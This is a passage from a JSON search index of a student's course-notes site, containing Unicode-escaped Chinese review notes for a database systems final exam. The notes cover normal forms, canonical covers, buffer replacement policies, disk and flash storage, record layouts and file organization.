\u5b66\u4e60\u51c6\u5907","text":"<p>\u6211\u7684\u51c6\u5907\u65b9\u5411\u4e3b\u8981\u96c6\u4e2d\u5728CV\uff0cRL\u548c\u8bfe\u5185\u90e8\u5206\u3002Agent\u90e8\u5206\u56e0\u4e3a\u5f53\u65f6\u6bd4\u8f83\u65b0\u5947\uff0c\u6ca1\u4ec0\u4e48\u516b\u80a1\uff0c\u800c\u4e14\u662f\u6700\u8fd1\u521a\u505a\u7684\u8bb0\u5fc6\u6e05\u6670\uff0c\u56e0\u6b64\u5c31\u6ca1\u548b\u51c6\u5907\u3002</p>"},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/","title":"\u6570\u636e\u5e93\u7cfb\u7edf\u671f\u672b\u590d\u4e60","text":"<p>\u6570\u636e\u5e93\u5b66\u4e60\u7b14\u8bb0</p> <p>\u5927\u4e8c\u4e0b\u5e73\u65f6\u82b1\u8d39\u65f6\u95f4\u6700\u957f\u7684\u8bfe\uff0c4\u4e2a\u7ec3\u4e60Project\u52a0\u4e0a\u56fe\u4e66\u7ba1\u7406\u7cfb\u7edf\u548cMiniSQL\uff0c\u4f46\u8fd9\u5176\u5b9e\u8fd8\u597d\uff0c\u56e0\u4e3a\u5b9e\u9a8c\u5176\u5b9e\u8bbe\u8ba1\u7684\u8d28\u91cf\u8fd8\u53ef\u4ee5\uff0cMiniSQL\u4e5f\u5f88\u6709\u6311\u6218\u6027\u300299%\u6076\u5fc3\u70b9\u8fd8\u662f\u5728\u671f\u672b\u8003\u8bd5\uff0c\u4eca\u5e74\u7a81\u7136\u53d8\u621019\u9053\u591a\u9009\uff0c\u5c24\u5176\u662f\u671f\u672b\u5386\u5e74\u5377\u7b54\u6848\u6781\u5176\u79bb\u8c31\uff0c\u5404\u5bb6\u8001\u5e08PPT\u4fa7\u91cd\u8fd8\u5404\u4e0d\u76f8\u540c\uff0c\u590d\u4e60\u6548\u679c\u4e0d\u4f73\u4e0d\u8bf4\uff0c\u6d6a\u8d39\u4e86\u5927\u91cf\u65f6\u95f4\u3002\u6211\u662f\u82d7\u8001\u5e08\u73ed\u7684\u5b66\u751f\uff0c\u82d7\u8001\u5e08\u4e0a\u8bfe\u5e76\u4e0d\u662f\u592a\u51fa\u5f69\uff0c\u5e76\u4e14\u5c0f\u6d4b\u8f83\u591a\uff0c\u4f46\u662f\u8fd9\u5b66\u671f\u7684\u52a9\u6559\u8001\u5e08\u5c0f\u6d4b\u90fd\u6279\u7684\u5f88\u5bbd\uff0c\u9a8c\u6536\u4e5f\u6bd4\u8f83\u5bbd\u677e\uff0c\u8fd8\u662f\u5efa\u8bae\u9009\u7684\u3002</p>"},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#3","title":"3. \u8303\u5f0f","text":"<p>\u597d\u7684relational design</p> <p>normalization\u7684\u76ee\u6807</p> <ul> <li>\u5206\u89e3\u4e00\u5b9a\u662f\u65e0\u635f</li> <li>\u4f46\u662f\u6700\u597d\u4fdd\u6301\u4f9d\u8d56</li> </ul> <p>\u200b\u200b</p> <p>\u6ee1\u8db3\u540e\u9762\u7684\u4e00\u5b9a\u6ee1\u8db3\u524d\u9762\u7684</p> <ul> <li>1NF the domains of all attributes of R are atomic</li> <li>2NF</li> <li> <p>3NF</p> </li> <li> <p>\u6761\u4ef6\uff0cBCNF\u7684\u6761\u4ef6\uff0c\u518d\u52a0\u4e0a\u4e00\u6761 \\(a\\rightarrow b\\) \u5982\u679c b-a(\u5982\u679ca\u4e0d\u5728b\u4e2d\uff0c\u90a3\u4e48b-a=b) \u88ab\u5305\u542b\u5728candidate key\u4e2d</p> </li> <li> <p>BCNF</p> </li> <li> <p>\u6761\u4ef6</p> </li> <li>\u5982\u4f55\u62c6\u5206\uff0c\u4e0d\u4e00\u5b9a\u9700\u8981\u4ece\u6b63\u5219\u8986\u76d6\u5f00\u59cb\uff0c\u4e0d\u65ad\u5730\u4ece\u539f\u96c6\u5408\u4e2d\u62c6\u51fa\u53bb\uff0c\u4f46\u662f\u539f\u96c6\u5408\u4f9d\u65e7\u9002\u7528\u4e8e\u4ee5\u524d\u6240\u6709\u7684\u4f9d\u8d56</li> <li> <p>4NF</p> </li> <li> <p>\u200b\u200b</p> </li> <li>\u6ee1\u8db34NF\u4e00\u5b9a\u6ee1\u8db3BCNF</li> </ul> <p>\u200b\u200b</p> <p>\u65e0\u635f\u5206\u89e3\uff0c\u4e24\u79cd\u5224\u5b9a\u65b9\u5f0f</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#_2","title":"\u51fd\u6570\u95ed\u5305","text":""},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#_3","title":"\u6b63\u5219\u8986\u76d6","text":"<p>\u6b63\u5219\u8986\u76d6\u672a\u5fc5\u662f\u552f\u4e00\u7684</p>"},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#_4","title":"\u65e0\u635f\u5206\u89e3","text":""},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#_5","title":"\u4f9d\u8d56\u4fdd\u6301","text":""},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#bcnf","title":"BCNF","text":""},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#3nf","title":"3NF","text":"<p>\u6d89\u53ca\u6b63\u5219\u8986\u76d6</p> <p>\u7b97candidate key</p>"},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#4","title":"4. \u6570\u636e\u5b58\u50a8\u548c\u67e5\u8be2","text":""},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#41-replacer-mru","title":"4.1 replacer * MRU","text":"<p>clock replacer</p> <p>\u200b\u200b</p> <p>\u5bf9\u4e8e\u4e0a\u9762\u7684\u6bcf\u4e2a\u70b9\u90fd\u7ef4\u62a4\u4e24\u4e2a\u5c5e\u6027pin count\u548creference bit\uff0c\u5982\u679c\u67d0\u4e2a\u70b9\u88ab\u8bbf\u95ee\uff0c\u5219\u5c06reference bit\u7f6e\u4e3a1\uff0c\u6bcf\u6b21\u8981\u66ff\u6362\u7684\u65f6\u5019\uff0c\u6307\u9488\u65cb\u8f6c\uff0c\u5982\u679creference bit\u4e3a0\u5c31\u66ff\u6362\u51fa\u6765\uff0c\u5982\u679c\u4e0d\u4e3a0\uff0c\u5c31\u5c06reference bit\u7f6e\u4e3a0\uff0c\u65cb\u8f6c\u5230\u4e0b\u4e00\u4e2a</p> <p>\u7a7a\u95f4\u5c40\u90e8\u6027</p> <p>\u65f6\u95f4\u5c40\u90e8\u6027</p> <p>\u8981\u8ba1\u7b97\u4e00\u4e2atable\u91cc\u9762\u7684\u5360\u4e86\u591a\u5c11\u4e2ablock\uff0c\u9996\u5148\u628ablock size / record size\uff0c\u5e76\u4e14\u5411\u4e0b\u53d6\u6574\uff0c\u7136\u540e\u5728\u628arecord\u4e2a\u6570/\u4e0a\u8ff0\u7ed3\u679c\uff0c\u7136\u540e\u5411\u4e0a\u53d6\u6574</p> <p>MRU</p> <p>system must pin the block currently being processed. After the final tuple of that block has been processed, the block is unpinned, and it becomes the most recently used block.</p> <p>\u5c06\u6700\u8fd1\u4f7f\u7528\u7684\u4f5c\u4e3a\u66ff\u6362\u5757</p> <p>toss-immediate strategy</p> <p>frees the space occupied by a block as soon as the final tuple of that block has been processed \u7528\u5b8c\u4e4b\u540e\u9a6c\u4e0afree</p>"},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#42","title":"4.2 \u7269\u7406\u7684\u5b58\u50a8","text":"<p>\u5b58\u50a8\u5c42\u6b21</p> <ul> <li>volatile\u6613\u5931\u5b58\u50a8 cache, main memory</li> <li>non-volatile\u4e0d\u6613\u5931\u5b58\u50a8 flash memory, disk...</li> <li>\u4e09\u7ea7\u5b58\u50a8</li> </ul> <p>\u78c1\u76d8\u5b58\u50a8</p> <p>\u78c1\u76d8\u6709\u591a\u4e2a\u76d8\u7247(platter)\uff0c\u78c1\u7247\u4e0a\u9762\u6709\u4e00\u4e2a\u8bfb\u5199\u5934(read-write head)\uff0c\u5728\u4f7f\u7528\u8fc7\u7a0b\u4e2d\uff0c\u78c1\u76d8\u4ee5\u6052\u5b9a\u7684\u901f\u5ea6\u65cb\u8f6c\uff0c\u8ba9\u8bfb\u5199\u5934\u6765\u8bfb\u5199\u3002</p> <p>\u76d8\u7247\u7684\u8868\u9762\u5206\u4e3a\u4e00\u4e2a\u4e2a\u78c1\u9053\uff08track\uff09\uff0c\u78c1\u9053\u53c8\u5206\u4e3a\u6247\u533a\uff08sector\uff09\u3002\u4e00\u822c\u6765\u8bf4\u4e00\u4e2a\u78c1\u76d8\u67091-5\u4e2a\u76d8\u7247\uff0c\u4e00\u4e2a\u76d8\u7247\u670950000-100000\u4e2a\u78c1\u9053\uff0c\u6bcf\u4e2a\u78c1\u9053\u6709500-1000\u7684\u6247\u533a\uff0c\u6bcf\u4e2a\u6247\u533a\u4e00\u822c\u90fd\u662f512\u5b57\u8282</p> <p>\u5f53\u4e00\u4e2a\u78c1\u76d8\u5934\u5728\u7b2ci\u4e2a\u78c1\u9053\u7684\u65f6\u5019\uff0c\u6240\u6709\u7684\u78c1\u76d8\u5934\u90fd\u5728\u7b2ci\u4e2a\u78c1\u9053\uff0c\u6240\u6709\u76d8\u7247\u7684\u7b2ci\u4e2a\u78c1\u9053\u6784\u6210\u4e86\u7b2ci\u4e2a\u67f1\u9762</p> <p>\u78c1\u76d8\u63a7\u5236\u5668disk controller</p> <p>\u78c1\u76d8\u7ed9\u8ba1\u7b97\u673a\u7684\u63a5\u53e3\u4e5f\u6709\u591a\u79cd</p> <ul> <li>SATA</li> <li>SCSI</li> <li>SAS</li> </ul> <p>\u78c1\u76d8\u6027\u80fd\u7684\u5ea6\u91cf</p> <p>\u6211\u4eec\u6709\u591a\u4e2a\u6307\u6807\u6765\u8861\u91cf\u78c1\u76d8\u7684\u6027\u80fd</p> <ul> <li>access time = seek time(\u5bfb\u9053\u65f6\u95f4) + rotational latency time(\u65cb\u8f6c\u5230\u6247\u533a\u65f6\u95f4) +\u6570\u636e\u91cf/\u6570\u636e\u4f20\u8f93\u7387(data-transfer rate)</li> <li>Mean Time to Failure(MTTF)\u5e73\u5747\u6545\u969c\u65f6\u95f4\uff0c\u73b0\u4ee3\u78c1\u76d8\u4e00\u822c\u5728500 000 - 1200 000\u5c0f\u65f6\u5185</li> </ul> <p>\u78c1\u76d8\u5757\u8bbf\u95ee\u4f18\u5316</p> <p>\u64cd\u4f5c\u7cfb\u7edf\u5411\u78c1\u76d8\u6570\u636e\u7684\u83b7\u53d6\u4e00\u822c\u662f\u4ee5\u5757block\u4e3a\u5355\u4f4d\u7684\uff0c\u4e00\u4e2a\u5757\u5927\u6982\u5728512\u5b57\u8282\u5230\u51e0KB\u4e4b\u95f4\u3002\u540c\u65f6\u8fd8\u88ab\u5206\u4e3a\u968f\u673a\u8bbf\u95ee\u548c\u987a\u5e8f\u8bbf\u95ee\u4e24\u79cd</p> <p>\u4e3a\u4e86\u63d0\u9ad8\u8bbf\u95ee\u5757\u7684\u901f\u5ea6\uff0c\u4ea7\u751f\u4e86\u8bb8\u591a\u6280\u672f</p> <ul> <li>buffering</li> </ul> <p>optimization of disk block access</p> <ul> <li>non-volatile wrtie buffer\uff0c\u4f8b\u5982battery backed up RAM \u6216\u8005 flash memory \u6216\u8005NVM</li> <li> <p>log disk \u4e13\u95e8\u4e00\u4e2a\u78c1\u76d8\u6765\u5199\u65e5\u5fd7\uff0c\u90fd\u662f\u987a\u5e8f\u5199\u7684\uff0c</p> </li> <li> <p>write is fast and no seeks are required</p> </li> <li>no need for special hardware</li> </ul> <p>flash storage</p> <ul> <li> <p>NAND flash\uff0c\u6bd4NOR flash\u66f4\u4fbf\u5b9c</p> </li> <li> <p>require page-at-a-time read\uff08\uff09not much difference between sequential and random read</p> </li> <li>page can only be written once</li> <li> <p>SSD</p> </li> <li> <p>block-oriented disk interfaces \u4f46\u662f\u7528\u7684\u662f\u95ea\u5b58\u5b58\u6570\u636e\uff0c\u4e5f\u5c31\u662f\u8bf4\u7528\u78c1\u76d8\u7684\u63a5\u53e3\uff0c\u4f46\u662f\u7528\u95ea\u5b58\u5b58\u50a8</p> </li> </ul> <p>\u200b\u200b</p> <p>\u5176\u7f3a\u9677\u5728\u4e8e\u9700\u8981\u5148\u64e6\u9664\uff0c\u518d\u5199 erase-&gt;rewrite</p> <ul> <li>\u4f18\u5316\u76ee\u6807\u662f\u5c11erase\uff0c\u4f7f\u5f97\u5404\u4e2a\u5757\u78e8\u635f\u7684\u5e73\u5747\u4e00\u70b9\uff0c\u6bd4\u5982\u6570\u636e\u6709\u903b\u8f91\u6807\u5fd7\u548c\u7269\u7406\u6807\u5fd7\uff0c\u4f7f\u5f97\u5176\u903b\u8f91\u5b58\u5728\u548c\u7269\u7406\u5730\u5740\u53ef\u4ee5\u5206\u79bb\uff0c\u6bd4\u5982\u8bf4\u5efa\u7acbremapping\u673a\u5236</li> <li>wear leveling \u78e8\u635f\u5747\u8861- evenly distributed erase operators across physical blocks</li> <li>\u200b\u200b</li> </ul> <p>\u5404\u79cd\u4ecb\u8d28\u7684\u6bd4\u8f83</p> <p>\u200b\u200b</p> <p>byte-address - block-addresss</p> <p>endurance \u662f\u8010\u4e45\u503c</p>"},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#43","title":"4.3 \u6587\u4ef6\u7ed3\u6784","text":"<p>\u4e00\u4e2a\u6570\u636e\u5e93\u5185\u90e8\u6709\u591a\u4e2a\u6587\u4ef6\uff0c\u6bcf\u4e2a\u6587\u4ef6\u662fa sequence of records, \u4e00\u4e2arecord\u662f a sequence of fields\u3002\u66f4\u51c6\u786e\u7684\u8bf4\u6cd5\u662f\u6bcf\u4e2a\u6587\u4ef6\u88ab\u5206\u4e3a\u5b9a\u957f\u7684\u5b58\u50a8\u5355\u5143 \u4e5f\u5c31\u662fblock\uff0c\u5bf9\u4e8eblock\u91cc\u9762\u5982\u4f55\u5b58\u50a8record\uff0c\u6709\u4e00\u4e9b\u505a\u6cd5\uff0c\u6bd4\u5982</p>"},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#fixed-length-records","title":"Fixed-Length Records","text":"<p>\u6211\u4eec\u53ef\u4ee5\u628a\u6bcf\u4e2a\u8bb0\u5f55\u7d27\u5bc6\u5730\u6392\u5217\uff0c\u6bcf\u4e2a\u5757\u5b58\u50a8\u80fd\u5b58\u50a8\u7684\u6700\u5927\u6570\u91cf\u7684records\uff0c\u4f46\u5b58\u5728\u4e00\u4e9b\u95ee\u9898\uff0c\u5f53\u6211\u4eec\u5220\u9664\u4e00\u6761\u8bb0\u5f55\u7684\u65f6\u5019\uff0c\u662f\u5426\u8981\u628a\u540e\u9762\u7684\u6240\u6709\u8bb0\u5f55\u90fd\u632a\u4e00\u4e0a\u6765\u4e00\u683c\uff0c\u8fd9\u4e48\u505a\u663e\u7136\u662f\u76f8\u5f53\u9ebb\u70e6\u7684\u3002</p> <p>\u53ef\u4ee5\u8003\u8651\u8fd9\u79cd\u505a\u6cd5\uff0c\u5728block\u7684\u5f00\u5934\u653e\u4e00\u4e9b\u6570\u636e\u4f5c\u4e3a\u5143\u6570\u636e\uff0c\u53ef\u4ee5\u5b58\u50a8\u7a7a\u5217\u8868\u7684\u5f00\u5934\u4f4d\u7f6e\uff0c\u7136\u540e\u5c06\u7a7a\u95f2\u7684\u5730\u65b9\u90fd\u4f5c\u4e3a\u94fe\u8868\u4e32\u8d77\u6765\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u4e0d\u5f71\u54cd\u63d2\u5165\u6548\u7387\u7684\u60c5\u51b5\u4e0b\uff0c\u6700\u5927\u5316\u5229\u7528\u7a7a\u95f4</p>"},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#variable-length-records","title":"variable-Length Records","text":"<p>\u6211\u4eec\u9700\u8981\u53d8\u957f\u8bb0\u5f55\u7684\u539f\u56e0\u6709</p> <p>\u4e00\u822c\u7684\u53d8\u957frecord\uff0c\u5f00\u5934\u4e5f\u4f1a\u6709\u4e00\u4e9b\u5b9a\u957f\u5c5e\u6027\uff0c\u4e00\u822c\u5c31\u662foffset+length\uff0coffset\u8868\u793a\u8be5\u8bb0\u5f55\u4e2d\u8be5\u5c5e\u6027\u7684\u6570\u636e\u5f00\u59cb\u7684\u4f4d\u7f6e\uff0clength\u8868\u793a\u957f\u5ea6\u3002\u5982\u4e0b\u56fe\uff0c\u524d\u4e09\u5bf9\u5c5e\u6027\u5c31\u662f\u5bf9\u4e8e\u4e09\u4e2a\u53d8\u957f\u5c5e\u6027\u7684\u63cf\u8ff0</p> <p>\u200b\u200b</p> <p>\u901a\u5e38\u8fd9\u91cc\u8fd8\u4f1a\u6709\u7a7a\u4f4d\u56fe\u7684\u4f7f\u7528null-value bitmap\uff0c\u8be5\u56fe\u8868\u793a\u90a3\u4e9b\u5c5e\u6027\u662f\u7a7a\u7684</p> <p>\u4e0a\u8ff0\u8bb2\u8ff0\u4e86\u53d8\u957frecord\u5185\u90e8\u7684\u7ed3\u6784\uff0c\u90a3\u4e48record\u672c\u8eab\u5728block\u4e2d\u662f\u5982\u4f55\u5b58\u50a8\u7684\u5462\uff0c\u4e00\u822c\u662f\u91c7\u7528slotted-page structure\uff0c\u5728\u8be5\u7ed3\u6784\u7684\u8868\u5934\uff0c\u5b58\u50a8\u7740</p> <ul> <li>block\u4e2d\u7684record\u6570\u91cf</li> <li>\u7a7a\u95f2\u7a7a\u95f4\u7684\u672b\u5c3e</li> <li>\u4e00\u4e2a\u7531\u8bb0\u5f55\u4f4d\u7f6e+\u5927\u5c0f\u7684\u8bb0\u5f55\u6761\u76ee\u6784\u6210\u7684\u6570\u7ec4</li> </ul> <p>\u200b\u200b</p> <p>\u5b9e\u9645\u7684\u8bb0\u5f55\u8981\u4eceblock\u7684\u5c3e\u90e8\u5f00\u59cb\u8fde\u7eed\u6392\u5217\uff0c\u7a7a\u95f2\u7a7a\u95f4\u662f\u8fde\u7eed\u7684\uff0crecord\u4e4b\u95f4\u4e5f\u662f\u8fde\u7eed\u7684\uff0c\u5f53record\u88ab\u5220\u9664\u4e86\uff0crecord\u524d\u9762\u7684\u8bb0\u5f55\u8981\u540e\u79fb\uff0c\u7ed9FreeSpace\u63d0\u4f9b\u7a7a\u95f4</p> <p>record pointer\u4e0d\u5e94\u8be5\u76f4\u63a5\u6307\u5411\u8bb0\u5f55\uff0c\u5e94\u8be5\u6307\u5411header\u91cc\u7684entry</p>"},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#_6","title":"\u6587\u4ef6\u4e2d\u8bb0\u5f55\u7684\u7ec4\u7ec7","text":"<ul> <li>heap</li> <li>sequential</li> <li>hashing file organization</li> <li>multitable clustering file</li> </ul> <p>heap file organization</p> <p>record\u53ef\u80fd\u88ab\u4e22\u5728\u6587\u4ef6\u4efb\u4f55\u7a7a\u95f2\u7684\u5730\u65b9\uff0c\u5173\u952e\u5728\u4e8eFree-space map\uff0c\u7528\u4e8e\u5feb\u901f\u627e\u5230\u7a7a\u95f2\u4f4d\u7f6e</p> <p>free space map</p> <p>\u200b\u200b</p> <p>\u4e0a\u8ff0\u7684\u6bcf\u4e2a\u5c0f\u65b9\u5757\u91cc\u9762\u653e3\u4e2abit\uff0c\u8868\u793a0-7\uff0c\u7528\u6765\u8868\u793a\u5bf9\u5e94\u7684block\uff0c\u6709n/8\u7684\u7a7a\u95f2\uff0c\u4f46\u662f\u5982\u679c\u6587\u4ef6\u7684\u5757\u5f88\u591a\uff0c\u5c31\u53ef\u4ee5\u591a\u751f\u6210\u51e0\u5c42\uff0c\u6bd4\u5982\u4e0a\u56fe\uff0cfirst level\u7684\u56db\u5757\u5bf9\u5e94second level\u7684\u4e00\u5757\uff0csecond level\u91cc\u9762\u5c31\u5b58\u56db\u5757\u91cc\u9762\u6700\u5927\u7684\u7a7a\u95f2</p> <p>\u6211\u8fd9\u4e2a\u6587\u4ef6\u91cc\u6709\u5f88\u591ablock\uff0c\u6211\u8981\u7528free space map\u53bb\u63cf\u8ff0\u4ed6\u4eec\u7a7a\u95f2\u72b6\u6001</p> <p>sequential</p> <p>\u987a\u5e8f\u6587\u4ef6\u662f\u4e3a\u4e86\u9ad8\u6548\u5904\u7406\u6309\u67d0\u4e2a\u641c\u7d22\u7801\u7684\u987a\u5e8f\u6392\u5e8f\u7684\u8bb0\u5f55\u800c\u8bbe\u8ba1\u7684\uff0c\u6211\u4eec\u7528\u6307\u9488\u628a\u8bb0\u5f55\u6309\u7167\u8fd9\u4e2a\u7801\u7684\u987a\u5e8f\u94fe\u63a5\u8d77\u6765</p> <p>deletion:\u628a\u7a7a\u95f2\u7684\u4e32\u8d77\u6765</p> <p>insertion:</p> <ul> <li>\u5982\u679c\u6709free space\u5c31\u63d2</li> <li>\u6ca1\u6709free space \u5c31\u63d2\u5230 overflow block</li> <li>\u90fd\u8981\u66f4\u65b0pointer chain</li> </ul> <p>need to reorganize the file from time to time</p> <p>\u540c\u6837\u7684\u63d2\u5165\u548c\u5220\u9664\uff0c\u4e5f\u9700\u8981\u6309\u7167\u94fe\u8868\u7684\u505a\u6cd5\u53bb\u505a</p> <p>multitable clustering File Organization</p> <p>\u628a\u591a\u4e2a\u8868\u5b58\u5728\u540c\u4e00\u4e2afile\u4e2d\u7684\u505a\u6cd5\uff0c\u5728\u5927\u578b\u6570\u636e\u5e93\u4e2d\uff0c\u4f7f\u7528\u5c06\u4e00\u4e2a\u6587\u4ef6\u5206\u4e3ablock\u7684\u505a\u6cd5\u662f\u6709\u6027\u80fd\u4e0a\u7684\u597d\u5904\u7684\uff0c\u6bcf\u4e2ablock\u8fd8\u662f\u4f1a\u5b58\u50a8\u4e00\u4e2a\u8868\uff0c\u8fd9\u6837\u7684\u597d\u5904\u662f\u4e0d\u4f9d\u8d56\u64cd\u4f5c\u7cfb\u7edf\u81ea\u5df1\u7684\u6587\u4ef6\u7cfb\u7edf\uff0c\u6570\u636e\u5e93\u7cfb\u7edf\u81ea\u5df1\u7ba1\u7406\u8fd9\u4e2a\u6587\u4ef6</p> <p>store several relations in one file</p> <p>\u540c\u65f6\u8fd9\u79cd\u6587\u4ef6\u7ec4\u7ec7\uff0c\u8fd8\u652f\u6301\u5728\u4e00\u4e2ablock\u5b58\u50a8\u4e24\u4e2a\u6216\u591a\u4e2arelation\u7684\u76f8\u5173records\uff0c\u53ef\u4ee5\u66f4\u9ad8\u6548\u7684\u5904\u7406join\u76f8\u5173\u7684\u67e5\u8be2\uff0c\u4f46\u662f\u76f8\u5bf9\u7684\u5176\u4ed6\u7c7b\u578b\u7684\u67e5\u8be2\u4f1a\u53d8\u6162\u3002</p> <p>\u4e3a\u4e86\u6709\u903b\u8f91\u7684\u5b58\u50a8\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u5c06\u540c\u4e00\u4e2a\u8868\u7684\u8bb0\u5f55\u7528\u94fe\u8868\u4e32\u8d77\u6765</p> <p>\u200b\u200b</p> <p>table partitioning</p> <p>records in relation can be partitioned into smaller relations that are stored separately</p> <ul> <li> <p>\u6309\u6c34\u5e73partition</p> </li> <li> <p>\u6bd4\u5982\u6309\u7167\u5b66\u751f\u7684\u6240\u5c5e\u5b66\u9662\u5206</p> </li> <li> <p>\u6309\u5782\u76f4partition</p> </li> <li> <p>\u6bd4\u5982\u5c06\u4e00\u4e9b\u5c5e\u6027\u653e\u5728\u4e00\u4e2arelation</p> </li> </ul> <p>data dictionary storage</p> <p>\u8fd9\u90e8\u5206\u53c8\u79f0\u4e3asystem catalog\uff0c\u4e5f\u5c31\u662f\u5173\u7cfb\u7684\u5143\u6570\u636e\u5b58\u50a8\uff0c\u540c\u65f6\u8fd8\u4f1a\u5b58\u50a8\u4e00\u4e9b\u7528\u6237\u7684\u4fe1\u606f</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/#44-buffer-manager","title":"4.4 buffer Manager","text":"<p>Block\u662f\u78c1\u76d8\u8bfb\u5199\u7684\u6700\u5c0f\u5355\u4f4d\uff0cbuffer manager\u5b58\u5728\u7684\u76ee\u7684\u662f\u6700\u5c0f\u5316\u8bfb\u5199\u6b21\u6570</p> <p>LRU </p> <p>\u200b\u200b</p> <p>buffer manager</p> <p>\u6570\u636e\u5e93\u7cfb\u7edf\u53d1\u51fablock\u8bf7\u6c42</p> <ul> <li>\u5df2\u7ecf\u5728buffer\u91cc\u9762\u4e86\uff0c\u76f4\u63a5\u7ed9\u4e3b\u5b58\u91cc\u7684\u5730\u5740</li> <li> <p>\u8fd8\u4e0d\u5728buffer \u91cc\u9762</p> </li> <li> <p>buffer \u91cc\u9762\u6709\u7a7a\u4f4d\u5c31\u76f4\u63a5\u8bfb\u4e00\u4e2a\u8fdb\u6765</p> </li> <li>buffer\u91cc\u9762\u6ca1\u7a7a\u4f4d\u5c31\u7528\u66ff\u6362\u7b56\u7565\u66ff\u4ee3\u4e00\u4e2a\uff0c\u5982\u679c\u662f\u810f\u9875\uff0c\u8868\u8ff0\u4e3a(it was modified since the most recent time that it was written to/fetch from disk) \u8981\u5199\u56de\u78c1\u76d8</li> </ul> <p>\u4e00\u4e9b\u7279\u6027</p> <ul> <li>pinning block \u662f\u6307\u4e0d\u5141\u8bb8\u88ab\u5199\u56de\u78c1\u76d8\u7684memory block\uff0c\u8bfb\u5199\u4e4b\u524d\u9700\u8981pin\uff0c\u8bfb\u5199\u5b8c\u6210\u540e\u9700\u8981unpin\uff0c\u9700\u8981\u7ef4\u62a4\u4e00\u4e2apin count\uff0c\u5f53\u5176\u4e3a0\u7684\u65f6\u5019\u624d\u80fdevict</li> <li> <p>shared and exclusive locks on buffer</p> </li> 